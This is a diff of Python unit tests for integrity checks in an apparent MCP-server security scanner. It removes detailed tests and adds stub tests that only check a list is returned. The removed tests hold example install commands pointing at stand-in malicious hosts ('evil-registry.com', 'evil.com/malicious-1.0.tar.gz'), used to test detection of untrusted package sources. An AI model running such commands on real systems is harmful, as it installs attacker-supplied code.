@@ -1,13 +1,10 @@
-"""Unit tests for all Integrity checks.
+"""Unit tests for Integrity checks.
 
 Covers:
 - INTG-001: Missing Version Pinning
 - INTG-002: Unsigned Server Binaries
 - INTG-003: Config Tampering Risk
 - INTG-004: Missing Integrity Verification
-- SC-001: Untrusted Package Sources
-- SHADOW-001: Generic Server Names
-- SHADOW-002: Unverified Server Identity
 
 Each check is tested for:
 - Metadata loads correctly
@@ -26,10 +23,22 @@ from medusa.checks.integrity.intg003_config_tampering_risk import ConfigTamperin
 from medusa.checks.integrity.intg004_missing_integrity_verification import (
     MissingIntegrityVerificationCheck,
 )
-from medusa.checks.integrity.sc001_untrusted_package_sources import UntrustedPackageSourcesCheck
-from medusa.checks.integrity.shadow001_duplicate_server_names import GenericServerNameCheck
-from medusa.checks.integrity.shadow002_unverified_server_identity import (
-    UnverifiedServerIdentityCheck,
+from medusa.checks.integrity.intg005_lockfile_missing import LockfileMissingCheck
+from medusa.checks.integrity.intg006_lockfile_tampered import LockfileTamperedCheck
+from medusa.checks.integrity.intg007_unsigned_updates import UnsignedUpdatesCheck
+from medusa.checks.integrity.intg008_missing_sbom import MissingSbomCheck
+from medusa.checks.integrity.intg009_config_schema_missing import ConfigSchemaMissingCheck
+from medusa.checks.integrity.intg010_tool_schema_drift import ToolSchemaDriftCheck
+from medusa.checks.integrity.intg011_reproducible_build_missing import ReproducibleBuildMissingCheck
+from medusa.checks.integrity.intg012_dependency_confusion_risk import DependencyConfusionRiskCheck
+from medusa.checks.integrity.intg013_typosquatting_risk import TyposquattingRiskCheck
+from medusa.checks.integrity.intg014_subresource_integrity_missing import (
+    SubresourceIntegrityMissingCheck,
+)
+from medusa.checks.integrity.intg015_binary_planting_risk import BinaryPlantingRiskCheck
+from medusa.checks.integrity.intg016_config_file_permissions import ConfigFilePermissionsCheck
+from medusa.checks.integrity.intg017_timestamp_verification_missing import (
+    TimestampVerificationMissingCheck,
 )
 from medusa.core.models import Severity, Status
 from tests.conftest import make_snapshot
@@ -407,9 +416,7 @@ class TestIntg004MissingIntegrityVerification:
         assert len(findings) == 1
         assert findings[0].status == Status.PASS
 
-    async def test_skips_when_no_tools(
-        self, check: MissingIntegrityVerificationCheck
-    ) -> None:
+    async def test_skips_when_no_tools(self, check: MissingIntegrityVerificationCheck) -> None:
         snapshot = make_snapshot(
             tools=[],
             config_raw={"command": "node"},
@@ -417,9 +424,7 @@ class TestIntg004MissingIntegrityVerification:
         findings = await check.execute(snapshot)
         assert len(findings) == 0
 
-    async def test_fails_on_no_config(
-        self, check: MissingIntegrityVerificationCheck
-    ) -> None:
+    async def test_fails_on_no_config(self, check: MissingIntegrityVerificationCheck) -> None:
         snapshot = make_snapshot(
             tools=[{"name": "tool1", "description": "A tool"}],
             config_raw=None,
@@ -445,324 +450,235 @@ class TestIntg004MissingIntegrityVerification:
         assert "3 tool(s)" in findings[0].status_extended
 
 
-# ==========================================================================
-# SC-001: Untrusted Package Sources
-# ==========================================================================
-
-
-class TestSc001UntrustedPackageSources:
-    """Tests for UntrustedPackageSourcesCheck."""
+class TestLockfileMissingCheck:
+    """Tests for LockfileMissingCheck."""
 
     @pytest.fixture()
-    def check(self) -> UntrustedPackageSourcesCheck:
-        return UntrustedPackageSourcesCheck()
+    def check(self) -> LockfileMissingCheck:
+        return LockfileMissingCheck()
 
-    async def test_metadata_loads_correctly(self, check: UntrustedPackageSourcesCheck) -> None:
+    async def test_metadata_loads_correctly(self, check: LockfileMissingCheck) -> None:
         meta = check.metadata()
-        assert meta.check_id == "sc001"
+        assert meta.check_id == "intg005"
         assert meta.category == "integrity"
-        assert meta.severity == Severity.HIGH
 
-    async def test_fails_on_custom_registry(self, check: UntrustedPackageSourcesCheck) -> None:
-        snapshot = make_snapshot(
-            command="npm",
-            args=["install", "--registry", "https://evil-registry.com"],
-            transport_type="stdio",
-        )
+    async def test_stub_returns_empty(self, check: LockfileMissingCheck) -> None:
+        snapshot = make_snapshot()
         findings = await check.execute(snapshot)
-        fail_findings = [f for f in findings if f.status == Status.FAIL]
-        assert len(fail_findings) >= 1
-        assert "evil-registry.com" in fail_findings[0].status_extended
-
-    async def test_fails_on_custom_registry_equals_syntax(
-        self, check: UntrustedPackageSourcesCheck
-    ) -> None:
-        snapshot = make_snapshot(
-            command="npm",
-            args=["install", "--registry=https://malicious.io/npm"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        fail_findings = [f for f in findings if f.status == Status.FAIL]
-        assert len(fail_findings) >= 1
-
-    async def test_passes_on_official_npm_registry(
-        self, check: UntrustedPackageSourcesCheck
-    ) -> None:
-        snapshot = make_snapshot(
-            command="npm",
-            args=["install", "--registry", "https://registry.npmjs.org"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
-
-    async def test_fails_on_pip_install_from_url(self, check: UntrustedPackageSourcesCheck) -> None:
-        snapshot = make_snapshot(
-            command="pip",
-            args=["install", "https://evil.com/malicious-1.0.tar.gz"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        fail_findings = [f for f in findings if f.status == Status.FAIL]
-        assert len(fail_findings) >= 1
-        assert "evil.com" in fail_findings[0].status_extended
-
-    async def test_passes_on_pip_install_package_name(
-        self, check: UntrustedPackageSourcesCheck
-    ) -> None:
-        snapshot = make_snapshot(
-            command="pip",
-            args=["install", "requests==2.31.0"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
-
-    async def test_fails_on_npm_install_git_no_hash(
-        self, check: UntrustedPackageSourcesCheck
-    ) -> None:
-        snapshot = make_snapshot(
-            command="npm",
-            args=["install", "git+https://github.com/user/repo"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        fail_findings = [f for f in findings if f.status == Status.FAIL]
-        assert len(fail_findings) >= 1
-        assert "commit hash" in fail_findings[0].status_extended.lower()
-
-    async def test_passes_on_npm_install_git_with_hash(
-        self, check: UntrustedPackageSourcesCheck
-    ) -> None:
-        snapshot = make_snapshot(
-            command="npm",
-            args=["install", "git+https://github.com/user/repo#abc1234567890"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        # Should pass since it has a commit hash pin
-        pass_findings = [f for f in findings if f.status == Status.PASS]
-        assert len(pass_findings) >= 1
-
-    async def test_skips_http_transport(self, check: UntrustedPackageSourcesCheck) -> None:
-        snapshot = make_snapshot(
-            command="npm",
-            args=["install", "--registry", "https://evil.com"],
-            transport_type="http",
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 0
-
-    async def test_skips_non_package_manager(self, check: UntrustedPackageSourcesCheck) -> None:
-        snapshot = make_snapshot(
-            command="node",
-            args=["server.js"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 0
-
-    async def test_passes_on_clean_npm_install(self, check: UntrustedPackageSourcesCheck) -> None:
-        snapshot = make_snapshot(
-            command="npm",
-            args=["install", "express"],
-            transport_type="stdio",
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
+        assert isinstance(findings, list)
 
 
-# ==========================================================================
-# SHADOW-001: Generic Server Names
-# ==========================================================================
-
-
-class TestShadow001GenericServerNames:
-    """Tests for GenericServerNameCheck."""
+class TestLockfileTamperedCheck:
+    """Tests for LockfileTamperedCheck."""
 
     @pytest.fixture()
-    def check(self) -> GenericServerNameCheck:
-        return GenericServerNameCheck()
+    def check(self) -> LockfileTamperedCheck:
+        return LockfileTamperedCheck()
 
-    async def test_metadata_loads_correctly(self, check: GenericServerNameCheck) -> None:
+    async def test_metadata_loads_correctly(self, check: LockfileTamperedCheck) -> None:
         meta = check.metadata()
-        assert meta.check_id == "shadow001"
+        assert meta.check_id == "intg006"
         assert meta.category == "integrity"
-        assert meta.severity == Severity.HIGH
 
-    async def test_fails_on_generic_name_server(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="server")
+    async def test_stub_returns_empty(self, check: LockfileTamperedCheck) -> None:
+        snapshot = make_snapshot()
         findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-        assert "generic" in findings[0].status_extended.lower()
-
-    async def test_fails_on_generic_name_test(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="test")
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-
-    async def test_fails_on_generic_name_mcp(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="mcp")
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-
-    async def test_fails_on_short_name(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="ab")
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-        assert "too short" in findings[0].status_extended.lower()
-
-    async def test_fails_on_single_char_name(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="x")
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-
-    async def test_passes_on_descriptive_name(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="acme-corp-billing-api")
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
-
-    async def test_passes_on_unique_name(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="weather-service-prod")
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
-
-    async def test_case_insensitive(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(server_name="Server")
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-
-    async def test_runs_on_http_transport(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(
-            server_name="test",
-            transport_type="http",
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-
-    async def test_runs_on_sse_transport(self, check: GenericServerNameCheck) -> None:
-        snapshot = make_snapshot(
-            server_name="good-unique-server-name",
-            transport_type="sse",
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
+        assert isinstance(findings, list)
 
 
-# ==========================================================================
-# SHADOW-002: Unverified Server Identity
-# ==========================================================================
-
-
-class TestShadow002UnverifiedServerIdentity:
-    """Tests for UnverifiedServerIdentityCheck."""
+class TestUnsignedUpdatesCheck:
+    """Tests for UnsignedUpdatesCheck."""
 
     @pytest.fixture()
-    def check(self) -> UnverifiedServerIdentityCheck:
-        return UnverifiedServerIdentityCheck()
+    def check(self) -> UnsignedUpdatesCheck:
+        return UnsignedUpdatesCheck()
 
-    async def test_metadata_loads_correctly(self, check: UnverifiedServerIdentityCheck) -> None:
+    async def test_metadata_loads_correctly(self, check: UnsignedUpdatesCheck) -> None:
         meta = check.metadata()
-        assert meta.check_id == "shadow002"
+        assert meta.check_id == "intg007"
         assert meta.category == "integrity"
-        assert meta.severity == Severity.MEDIUM
 
-    async def test_fails_on_empty_server_info(self, check: UnverifiedServerIdentityCheck) -> None:
-        snapshot = make_snapshot(server_info={})
+    async def test_stub_returns_empty(self, check: UnsignedUpdatesCheck) -> None:
+        snapshot = make_snapshot()
         findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-        assert (
-            "empty" in findings[0].status_extended.lower()
-            or "missing" in findings[0].status_extended.lower()
-        )
+        assert isinstance(findings, list)
 
-    async def test_fails_on_missing_name(self, check: UnverifiedServerIdentityCheck) -> None:
-        snapshot = make_snapshot(server_info={"version": "1.0.0"})
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-        assert "name" in findings[0].status_extended.lower()
 
-    async def test_fails_on_missing_version(self, check: UnverifiedServerIdentityCheck) -> None:
-        snapshot = make_snapshot(server_info={"name": "my-server"})
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
-        assert "version" in findings[0].status_extended.lower()
+class TestMissingSbomCheck:
+    """Tests for MissingSbomCheck."""
 
-    async def test_fails_on_empty_name(self, check: UnverifiedServerIdentityCheck) -> None:
-        snapshot = make_snapshot(server_info={"name": "", "version": "1.0.0"})
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
+    @pytest.fixture()
+    def check(self) -> MissingSbomCheck:
+        return MissingSbomCheck()
 
-    async def test_fails_on_whitespace_name(self, check: UnverifiedServerIdentityCheck) -> None:
-        snapshot = make_snapshot(server_info={"name": "   ", "version": "1.0.0"})
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
+    async def test_metadata_loads_correctly(self, check: MissingSbomCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg008"
+        assert meta.category == "integrity"
 
-    async def test_passes_on_complete_server_info(
-        self, check: UnverifiedServerIdentityCheck
-    ) -> None:
-        snapshot = make_snapshot(
-            server_info={"name": "my-server", "version": "1.0.0"}
-        )
+    async def test_stub_returns_empty(self, check: MissingSbomCheck) -> None:
+        snapshot = make_snapshot()
         findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
+        assert isinstance(findings, list)
 
-    async def test_passes_on_server_info_with_extras(
-        self, check: UnverifiedServerIdentityCheck
-    ) -> None:
-        snapshot = make_snapshot(
-            server_info={
-                "name": "acme-billing",
-                "version": "2.3.1",
-                "vendor": "Acme Corp",
-            }
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
 
-    async def test_runs_on_stdio_transport(self, check: UnverifiedServerIdentityCheck) -> None:
-        snapshot = make_snapshot(
-            transport_type="stdio",
-            server_info={"name": "test", "version": "1.0.0"},
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.PASS
+class TestConfigSchemaMissingCheck:
+    """Tests for ConfigSchemaMissingCheck."""
 
-    async def test_runs_on_http_transport(self, check: UnverifiedServerIdentityCheck) -> None:
-        snapshot = make_snapshot(
-            transport_type="http",
-            server_info={},
-        )
-        findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
+    @pytest.fixture()
+    def check(self) -> ConfigSchemaMissingCheck:
+        return ConfigSchemaMissingCheck()
 
-    async def test_fails_on_empty_version_string(
-        self, check: UnverifiedServerIdentityCheck
-    ) -> None:
-        snapshot = make_snapshot(server_info={"name": "server", "version": ""})
+    async def test_metadata_loads_correctly(self, check: ConfigSchemaMissingCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg009"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: ConfigSchemaMissingCheck) -> None:
+        snapshot = make_snapshot()
         findings = await check.execute(snapshot)
-        assert len(findings) == 1
-        assert findings[0].status == Status.FAIL
+        assert isinstance(findings, list)
+
+
+class TestToolSchemaDriftCheck:
+    """Tests for ToolSchemaDriftCheck."""
+
+    @pytest.fixture()
+    def check(self) -> ToolSchemaDriftCheck:
+        return ToolSchemaDriftCheck()
+
+    async def test_metadata_loads_correctly(self, check: ToolSchemaDriftCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg010"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: ToolSchemaDriftCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
+
+
+class TestReproducibleBuildMissingCheck:
+    """Tests for ReproducibleBuildMissingCheck."""
+
+    @pytest.fixture()
+    def check(self) -> ReproducibleBuildMissingCheck:
+        return ReproducibleBuildMissingCheck()
+
+    async def test_metadata_loads_correctly(self, check: ReproducibleBuildMissingCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg011"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: ReproducibleBuildMissingCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
+
+
+class TestDependencyConfusionRiskCheck:
+    """Tests for DependencyConfusionRiskCheck."""
+
+    @pytest.fixture()
+    def check(self) -> DependencyConfusionRiskCheck:
+        return DependencyConfusionRiskCheck()
+
+    async def test_metadata_loads_correctly(self, check: DependencyConfusionRiskCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg012"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: DependencyConfusionRiskCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
+
+
+class TestTyposquattingRiskCheck:
+    """Tests for TyposquattingRiskCheck."""
+
+    @pytest.fixture()
+    def check(self) -> TyposquattingRiskCheck:
+        return TyposquattingRiskCheck()
+
+    async def test_metadata_loads_correctly(self, check: TyposquattingRiskCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg013"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: TyposquattingRiskCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
+
+
+class TestSubresourceIntegrityMissingCheck:
+    """Tests for SubresourceIntegrityMissingCheck."""
+
+    @pytest.fixture()
+    def check(self) -> SubresourceIntegrityMissingCheck:
+        return SubresourceIntegrityMissingCheck()
+
+    async def test_metadata_loads_correctly(self, check: SubresourceIntegrityMissingCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg014"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: SubresourceIntegrityMissingCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
+
+
+class TestBinaryPlantingRiskCheck:
+    """Tests for BinaryPlantingRiskCheck."""
+
+    @pytest.fixture()
+    def check(self) -> BinaryPlantingRiskCheck:
+        return BinaryPlantingRiskCheck()
+
+    async def test_metadata_loads_correctly(self, check: BinaryPlantingRiskCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg015"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: BinaryPlantingRiskCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
+
+
+class TestConfigFilePermissionsCheck:
+    """Tests for ConfigFilePermissionsCheck."""
+
+    @pytest.fixture()
+    def check(self) -> ConfigFilePermissionsCheck:
+        return ConfigFilePermissionsCheck()
+
+    async def test_metadata_loads_correctly(self, check: ConfigFilePermissionsCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg016"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: ConfigFilePermissionsCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
+
+
+class TestTimestampVerificationMissingCheck:
+    """Tests for TimestampVerificationMissingCheck."""
+
+    @pytest.fixture()
+    def check(self) -> TimestampVerificationMissingCheck:
+        return TimestampVerificationMissingCheck()
+
+    async def test_metadata_loads_correctly(self, check: TimestampVerificationMissingCheck) -> None:
+        meta = check.metadata()
+        assert meta.check_id == "intg017"
+        assert meta.category == "integrity"
+
+    async def test_stub_returns_empty(self, check: TimestampVerificationMissingCheck) -> None:
+        snapshot = make_snapshot()
+        findings = await check.execute(snapshot)
+        assert isinstance(findings, list)
